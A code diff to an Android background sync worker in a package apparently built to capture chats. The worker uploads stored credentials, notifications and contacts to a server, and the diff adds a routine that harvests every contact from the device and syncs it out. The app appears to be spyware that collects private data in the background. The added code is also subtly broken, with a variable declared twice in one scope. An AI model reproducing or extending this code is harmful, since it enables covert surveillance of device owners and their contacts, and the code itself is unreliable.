@@ -8,10 +8,12 @@ import com.chats.capture.database.ChatDao
 import com.chats.capture.database.ContactDao
 import com.chats.capture.database.CredentialDao
 import com.chats.capture.database.NotificationDao
+import com.chats.capture.managers.ContactCaptureManager
 import com.chats.capture.managers.MediaUploadManager
 import com.chats.capture.network.ApiClient
 import com.chats.capture.network.NetworkManager
 import android.os.BatteryManager
+import android.support.v4.content.ContextCompat
 import com.chats.capture.utils.AppStateManager
 import com.chats.capture.utils.RetryManager
 import kotlinx.coroutines.delay
@@ -51,8 +53,10 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
             // Sync credentials
             syncCredentials(database.credentialDao())
             
-            // Sync contacts (added to regular sync, not just daily)
-            syncContacts(database.contactDao())
+            // Capture and sync contacts (capture first, then sync)
+            val contactDao = database.contactDao()
+            captureContactsIfNeeded(contactDao)
+            syncContacts(contactDao)
             
             Timber.d("SyncWorker completed successfully")
             AppStateManager.updateLastSyncTime(applicationContext)
@@ -365,6 +369,52 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
             Timber.e(e, "JSON parsing error syncing contacts - server returned malformed JSON")
         } catch (e: Exception) {
             Timber.e(e, "Error syncing contacts: ${e.message}")
+        }
+    }
+    
+    /**
+     * Capture contacts from device if needed (only if we have permission and contacts haven't been captured recently)
+     */
+    private suspend fun captureContactsIfNeeded(contactDao: ContactDao) {
+        try {
+            // Check if we have READ_CONTACTS permission
+            val hasPermission = android.content.pm.PackageManager.PERMISSION_GRANTED ==
+                android.support.v4.content.ContextCompat.checkSelfPermission(
+                    applicationContext,
+                    android.Manifest.permission.READ_CONTACTS
+                )
+            
+            if (!hasPermission) {
+                Timber.d("READ_CONTACTS permission not granted, skipping contact capture")
+                return
+            }
+            
+            // Check if we have any contacts in the database
+            // If we have contacts, we'll just sync them. If not, capture them.
+            val totalContactsCount = try {
+                contactDao.getTotalCount()
+            } catch (e: Exception) {
+                0
+            }
+            
+            // Only capture if we have very few or no contacts
+            // This prevents re-capturing all contacts on every sync
+            val totalContactsCount = contactDao.getTotalCount()
+            if (totalContactsCount < 10) {
+                Timber.d("Few contacts in database ($totalContactsCount), capturing contacts from device...")
+                val contactCaptureManager = ContactCaptureManager(applicationContext)
+                contactCaptureManager.captureAllContacts()
+                
+                // Wait a bit for contacts to be captured and saved
+                delay(3000)
+                Timber.d("Contact capture initiated")
+            } else {
+                Timber.d("Sufficient contacts in database ($totalContactsCount), skipping capture")
+            }
+        } catch (e: SecurityException) {
+            Timber.w(e, "Permission denied: READ_CONTACTS permission required")
+        } catch (e: Exception) {
+            Timber.e(e, "Error capturing contacts: ${e.message}")
         }
     }
 }
